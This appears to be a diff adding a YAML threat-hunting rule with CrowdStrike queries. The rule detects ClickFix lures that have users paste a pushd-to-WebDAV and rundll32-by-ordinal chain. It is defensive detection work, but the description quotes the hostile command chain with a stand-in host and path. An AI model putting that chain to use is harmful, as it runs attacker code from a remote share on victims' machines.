@@ -1,0 +1,330 @@
+# Converted from THORCollective/HEARTH Flames/H313.md. hunt/HEARTH/ sits outside the
+# validated corpus; see hunt/HEARTH/README.md.
+type: detection
+
+id: hg-win-hearth-h313-pasted-pushd-to-webdav-share-running-rundll32-by-ordinal-t1218-011
+version: 1.0.0
+
+info:
+  name: Pasted pushd to a WebDAV share followed by rundll32 running a payload by ordinal
+  description: >-
+    A ClickFix lure has the user paste a three-part chain: pushd \\host\path\victim_id
+    && rundll32.exe pf.ch #1 && popd. pushd maps the attacker's WebDAV share to a drive
+    letter, rundll32 runs a DLL from it that carries a non-DLL extension, by ordinal
+    instead of a named export, and popd unmaps it. Nothing is downloaded by a browser,
+    the extension defeats rules keyed on .dll and the ordinal defeats rules keyed on
+    export names. HEARTH describes the invariant as a rundll32 command line containing a
+    UNC path, but in this chain the UNC path is on the shell's command line: pushd
+    changes directory to the mapped drive, so rundll32 receives only the relative file
+    name. The hunt therefore returns the shell command that carries the chain, rundll32
+    called by ordinal on a file that is not a DLL, rundll32 with a UNC path for the
+    direct form, and the WebDAV client call that names the remote host.
+  severity: high
+  author: huntgraph
+  tags:
+    - hearth
+    - defense-evasion
+    - rundll32
+    - webdav
+    - clickfix
+    - ordinal-export
+    - user-execution
+    - windows
+  references:
+    - https://github.com/THORCollective/HEARTH/blob/main/Flames/H313.md
+    - https://attack.mitre.org/techniques/T1218/011
+    - https://attack.mitre.org/detectionstrategies/DET0475
+
+mitre:
+  tactics:
+    - TA0005
+  techniques:
+    - T1218
+  sub_techniques:
+    - T1218.011
+  detection_strategies:
+    - DET0475
+  analytics:
+    - AN1308
+  platforms:
+    - Windows
+  data_sources:
+    - WinEventLog:Sysmon
+  data_components:
+    - Process Creation
+
+hypothesis:
+  statement: >-
+    An adversary is using a ClickFix lure to have users paste a command that mounts an
+    attacker-controlled WebDAV share with pushd and runs an extensionless or
+    wrongly-named DLL from it through rundll32 by ordinal, so that no file is downloaded
+    and no export name appears.
+  attacker_behavior:
+    - Has the user paste a chain into the Run dialog or a terminal.
+    - Mounts a WebDAV share with pushd on a UNC path that embeds a victim identifier.
+    - "Runs rundll32.exe on a file such as pf.ch with #1 as the entry point."
+    - Unmounts the share with popd.
+    - Unpacks a stealer in memory and resolves its C2 through a dead-drop page.
+  legitimate_behavior:
+    - Administrators use pushd on internal UNC paths in scripts.
+    - Installers call rundll32 by ordinal on their own DLLs.
+    - SharePoint and other WebDAV use starts the WebClient service.
+  risk_indicator:
+    - One command line holds pushd on a UNC path and rundll32.
+    - rundll32's target has an extension other than .dll, .cpl or .ocx and is called by ordinal.
+    - The UNC host is external or has a randomised subdomain.
+    - The shell's parent is explorer.exe, as for a Run dialog paste.
+    - DavSetCookie names a host the organisation does not use.
+
+requires:
+  platforms:
+    - windows
+  connectors:
+    - crowdstrike-ngsiem
+  logs:
+    - source: process_creation
+      connector: crowdstrike-ngsiem
+      event_types:
+        - ProcessRollup2
+      fields:
+        agent_id: aid
+        host: ComputerName
+        user: UserName
+        image_name: FileName
+        image_path: ImageFileName
+        command_line: CommandLine
+        parent_process: ParentBaseFileName
+        process_id: TargetProcessId
+        parent_process_id: ParentProcessId
+    - source: registry
+      connector: crowdstrike-ngsiem
+      event_types:
+        - RegGenericValueUpdate
+      fields:
+        agent_id: aid
+        host: ComputerName
+        registry_path: RegObjectName
+        registry_value: RegValueName
+        registry_data: RegStringValue
+        writer_process_id: ContextProcessId
+
+query:
+  - platform: crowdstrike
+    language: cql
+
+    cases:
+      - id: shell-chain-with-pushd-unc-and-rundll32
+        name: Shell command with pushd on a UNC path and rundll32
+        purpose: >-
+          Return cmd and PowerShell command lines that hold both pushd on a UNC path and
+          rundll32. This is where the remote host and the victim identifier in the path
+          are visible. A Run dialog paste needs cmd /c in front, so the shell's parent
+          is explorer.exe; a paste into an open terminal runs inside the existing shell
+          and only the rundll32 child is seen.
+        query: |
+          #event_simpleName=ProcessRollup2
+          | event_platform=Win
+          | FileName=/^(cmd|powershell|pwsh)\.exe$/i
+          | CommandLine=/\bpushd\s+"?\\\\/i
+          | CommandLine=/rundll32/i
+        filters:
+          include: []
+          exclude: []
+        baseline:
+          required: false
+          window: null
+          compare: []
+
+      - id: rundll32-ordinal-call-on-non-dll-file
+        name: rundll32 calling an ordinal on a file that is not a DLL by name
+        purpose: >-
+          Return rundll32 whose first argument is called by ordinal and does not end in
+          .dll, .cpl or .ocx. After pushd the file is named relative to the mapped
+          drive, so the command line is as short as rundll32.exe pf.ch #1 with no path
+          at all.
+        query: |
+          #event_simpleName=ProcessRollup2
+          | event_platform=Win
+          | FileName=/^rundll32\.exe$/i
+          | CommandLine=/rundll32(\.exe)?"?\s+"?[^\s",]+"?\s*,?\s*#\d+/i
+          | CommandLine!=/\.(dll|cpl|ocx)"?\s*,?\s*#\d+/i
+        filters:
+          include: []
+          exclude: []
+        baseline:
+          required: false
+          window: null
+          compare: []
+
+      - id: rundll32-target-on-unc-path
+        name: rundll32 given a target on a UNC path
+        purpose: >-
+          Return rundll32 whose target is a UNC path, the form used when the chain skips
+          pushd.
+        query: |
+          #event_simpleName=ProcessRollup2
+          | event_platform=Win
+          | FileName=/^rundll32\.exe$/i
+          | CommandLine=/rundll32(\.exe)?"?\s+"?\\\\[^\\\s]+\\/i
+        filters:
+          include: []
+          exclude: []
+        baseline:
+          required: false
+          window: null
+          compare: []
+
+      - id: webdav-client-cookie-call
+        name: WebDAV client call naming the remote host
+        purpose: >-
+          Return rundll32 running davclnt.dll,DavSetCookie, which the WebClient service
+          starts when a WebDAV path is opened and which carries the remote URL as an
+          argument. H244 has the same case for another lure; it is repeated here because
+          it is the record of where the share was.
+        query: |
+          #event_simpleName=ProcessRollup2
+          | event_platform=Win
+          | FileName=/^rundll32\.exe$/i
+          | CommandLine=/davclnt\.dll\s*,\s*DavSetCookie/i
+        filters:
+          include: []
+          exclude: []
+        baseline:
+          required: false
+          window: null
+          compare: []
+
+      - id: run-dialog-history-holding-chain
+        name: Run dialog history holding the chain
+        purpose: >-
+          Return RunMRU values whose data holds pushd, rundll32 or a UNC path. RunMRU
+          keeps what was pasted into the Run dialog and shows the user ran it.
+        query: |
+          #event_simpleName=RegGenericValueUpdate
+          | RegObjectName=/\\Explorer\\RunMRU$/i
+          | RegStringValue=/\bpushd\b|rundll32|\\\\[^\\\s]+\\/i
+        filters:
+          include: []
+          exclude: []
+        baseline:
+          required: false
+          window: null
+          compare: []
+
+evidence:
+  required:
+    - id: rundll32_run_from_mounted_share
+      name: rundll32 run from a mounted share or by ordinal on a non-DLL
+      description: >-
+        A shell command pairs pushd on a UNC path with rundll32, or rundll32 calls an
+        ordinal on a file whose name is not a DLL's, or its target is a UNC path.
+      source: process_creation
+      field: command_line
+      indicates: proxy_execution_from_remote_share
+
+  supporting:
+    - id: explorer_parent
+      name: Shell was started from the Run dialog
+      description: >-
+        The shell's parent is explorer.exe.
+      source: process_creation
+      field: parent_process
+      indicates: user_pasted_command
+    - id: rundll32_child_of_chain_shell
+      name: rundll32 is the chain shell's child
+      description: >-
+        The rundll32 event's parent process id is the shell that carried the pushd
+        chain.
+      source: process_creation
+      field: parent_process_id
+      indicates: same_chain
+    - id: webdav_fetch_to_external_host
+      name: WebDAV client contacted an external host
+      description: >-
+        DavSetCookie ran on the host within moments, naming a host that is not an
+        internal WebDAV server.
+      source: process_creation
+      field: image_name
+      indicates: remote_share_mounted
+    - id: user_context
+      name: Ran in a user's interactive session
+      description: >-
+        The chain ran under an ordinary user account.
+      source: process_creation
+      field: user
+      indicates: user_initiated_execution
+    - id: run_dialog_history
+      name: Chain recorded in RunMRU
+      description: >-
+        RunMRU holds the pasted command.
+      source: registry
+      field: registry_data
+      indicates: user_pasted_command
+    - id: run_dialog_history_key
+      name: RunMRU written
+      description: >-
+        The write is to the Run dialog history key of the same user.
+      source: registry
+      field: registry_path
+      indicates: user_pasted_command
+
+  contradicting:
+    - id: internal_share
+      name: Share is an internal server
+      description: >-
+        The UNC host is an internal file or SharePoint server the organisation runs.
+      source: asset_inventory
+      field: ComputerName
+      indicates: internal_resource
+    - id: known_installer_ordinal_call
+      name: Known installer calls its own DLL by ordinal
+      description: >-
+        The rundll32 call belongs to an installed product and recurs across hosts.
+      source: baseline
+      field: ComputerName
+      indicates: vendor_software
+
+  risk_logic:
+    required:
+      - rundll32_run_from_mounted_share
+
+    supporting:
+      any:
+        - explorer_parent
+        - rundll32_child_of_chain_shell
+        - webdav_fetch_to_external_host
+        - user_context
+        - run_dialog_history
+        - run_dialog_history_key
+      all:
+        - explorer_parent
+        - webdav_fetch_to_external_host
+
+    contradicting:
+      any:
+        - internal_share
+        - known_installer_ordinal_call
+      all: []
+
+  verdict:
+    low_risk_when:
+      - rundll32_run_from_mounted_share
+      - internal_share
+      - known_installer_ordinal_call
+    suspicious_when:
+      - rundll32_run_from_mounted_share
+      - explorer_parent
+    high_risk_when:
+      - rundll32_run_from_mounted_share
+      - rundll32_child_of_chain_shell
+      - webdav_fetch_to_external_host
+
+  false_positive:
+    - condition: Installers calling an ordinal on a temporary file.
+      explanation: >-
+        Some setup programs run rundll32 on a .tmp file by ordinal. The parent is the
+        installer and the file is under its own Temp directory.
+    - condition: Scripts using pushd on internal shares.
+      explanation: >-
+        Administrative scripts pushd to a file server and run tools from it. The host is
+        internal and rundll32 is seldom what they run.
